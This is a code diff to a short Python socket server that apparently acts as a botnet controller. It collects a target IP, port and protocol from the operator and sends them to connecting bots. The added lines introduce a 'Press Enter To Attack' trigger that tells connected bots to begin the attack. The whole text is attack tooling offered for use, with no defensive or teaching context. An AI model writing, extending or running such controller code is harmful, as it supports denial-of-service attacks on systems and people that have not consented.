@@ -9,6 +9,7 @@ print('Socket is listening')
 hostname = input("IP:")
 hostport = input("Port:")
 proto = input("Protocol:")
+x = True
 while True:
     c, addr = s.accept()
     c.send(hostname.encode())
@@ -21,4 +22,12 @@ while True:
     c, addr = s.accept()
     c.send(proto.encode())
     c.close()
+    if x == True:
+        x = input("Press Enter To Attack")
+        c, addr = s.accept()
+        c.send(x.encode())
+        c.close()
+        print("Attack Started!!!")
+        x = False
     print('Bot connected from', addr)
+    
